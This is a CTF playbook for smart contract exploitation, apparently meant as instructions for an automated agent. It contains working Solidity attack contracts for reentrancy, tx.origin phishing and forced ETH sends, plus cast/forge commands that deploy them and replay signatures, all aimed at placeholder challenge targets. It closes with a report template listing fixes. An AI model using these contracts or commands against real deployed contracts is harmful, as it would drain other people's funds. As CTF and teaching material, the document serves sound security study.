# Web3 / Blockchain CTF — Smart Contract Exploitation

## Overview
Smart contract vulnerabilities allow draining funds or breaking invariants.
Tools: Foundry (cast/forge), Hardhat, Remix IDE, ethers.js, web3.py.

## Prerequisites
```bash
# Install Foundry
curl -L https://foundry.paradigm.xyz | bash && foundryup
```

## Phase 1: Environment Setup
```bash
export RPC_URL="http://CHALLENGE_IP:PORT"
export PRIVATE_KEY="0xYOUR_PRIVATE_KEY"
export WALLET="0xYOUR_WALLET"
export CONTRACT="0xCHALLENGE_CONTRACT"

# Check balance
cast balance $WALLET --rpc-url $RPC_URL

# Quick liveness check
cast block-number --rpc-url $RPC_URL
```

## Phase 2: Recon & State Mapping
```bash
# Read basic storage slots
for i in $(seq 0 20); do
  echo "Slot $i: $(cast storage $CONTRACT $i --rpc-url $RPC_URL)"
done | tee /workspace/output/TARGET_web3_storage.txt

# Check implementation slot (EIP-1967)
cast storage $CONTRACT \
  0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc \
  --rpc-url $RPC_URL | tee /workspace/output/TARGET_web3_impl_slot.txt

# Read common view methods (if known)
cast call $CONTRACT "isSolved()(bool)" --rpc-url $RPC_URL \
  | tee /workspace/output/TARGET_web3_is_solved.txt
```

## Phase 3: Common Vulnerability Patterns

### 1) Reentrancy
```solidity
contract ReentrancyAttack {
    address target;
    constructor(address _t) { target = _t; }

    function attack() external payable {
        (bool ok,) = target.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(ok);
        target.call(abi.encodeWithSignature("withdraw()"));
    }

    receive() external payable {
        if (target.balance >= 1 ether) {
            target.call(abi.encodeWithSignature("withdraw()"));
        }
    }
}
```

```bash
forge create --rpc-url $RPC_URL --private-key $PRIVATE_KEY \
  src/Attack.sol:ReentrancyAttack --constructor-args $CONTRACT
cast send ATTACK_ADDR "attack()" --value 1ether \
  --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

### 2) Integer Overflow (Solidity < 0.8.0)
```bash
cast call $CONTRACT "balanceOf(address)(uint256)" $WALLET --rpc-url $RPC_URL
cast send $CONTRACT "transfer(address,uint256)" DUMMY_ADDR 1 \
  --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

### 3) tx.origin Phishing
```solidity
contract PhishingAttack {
    address target;
    constructor(address _t) { target = _t; }
    function phish() external {
        target.call(abi.encodeWithSignature("withdraw()"));
    }
}
```

### 4) Uninitialized Storage / Proxy Collision
```bash
# If owner/roles are uninitialized, set them by calling init functions
# Look for "initialize" or "init" methods in ABI
```

### 5) Selfdestruct / Forced ETH Send
```solidity
contract ForceEth {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}
```

### 6) Flash Loan Price Manipulation
```bash
# Check AMM reserves to spot manipulable pricing
cast call PAIR "getReserves()(uint112,uint112,uint32)" --rpc-url $RPC_URL
```

### 7) Signature Replay / Lack of Nonce
```bash
# Pull a prior tx and reuse a signature if nonce/chainId are missing
cast tx TX_HASH --rpc-url $RPC_URL
cast send $CONTRACT "claimWithSig(address,uint256,bytes)" \
  $WALLET AMOUNT SIGNATURE --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

## Phase 4: Testing Workflow (Foundry)
```bash
forge init /workspace/output/web3_test
cd /workspace/output/web3_test

# Add your exploit test in test/Solve.t.sol
forge test -vvv --rpc-url $RPC_URL
```

## Useful cast Commands
```bash
# Decode calldata
cast calldata-decode "transfer(address,uint256)" 0xCALLDATA

# Events
cast logs --from-block 0 --to-block latest --address $CONTRACT --rpc-url $RPC_URL

# Contract bytecode
cast code $CONTRACT --rpc-url $RPC_URL
```

## Foundry Test Template
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

contract SolveTest is Test {
    address constant TARGET = 0xCHALLENGE_CONTRACT;
    address constant PLAYER = 0xYOUR_WALLET;

    function setUp() public {
        vm.createSelectFork("http://CHALLENGE_IP:PORT");
    }

    function testSolve() public {
        vm.startPrank(PLAYER);
        // exploit here
        assertTrue(IChallenge(TARGET).isSolved());
    }
}
```

## Report Template

```
Target: CHALLENGE_NAME
Contract: 0xCHALLENGE_CONTRACT
Assessment Date: <DATE>

## Confirmed Findings
- [ ] Vulnerability class (e.g., reentrancy, overflow, auth bypass)
- [ ] Exploit path validated on fork
- [ ] Challenge solved / invariant broken

## Evidence
- Storage dump: /workspace/output/TARGET_web3_storage.txt
- Solve check: /workspace/output/TARGET_web3_is_solved.txt

## Recommendations
1. Add reentrancy guards and checks-effects-interactions
2. Use Solidity >=0.8.0 or safe math libraries
3. Replace tx.origin with msg.sender
4. Enforce nonces and chainId in signed messages
```

## Output Files
- `/workspace/output/TARGET_web3_storage.txt` — storage dump
- `/workspace/output/TARGET_web3_impl_slot.txt` — proxy slot
- `/workspace/output/TARGET_web3_is_solved.txt` — solve status

indicators: web3 blockchain solidity smart contract ethereum reentrancy
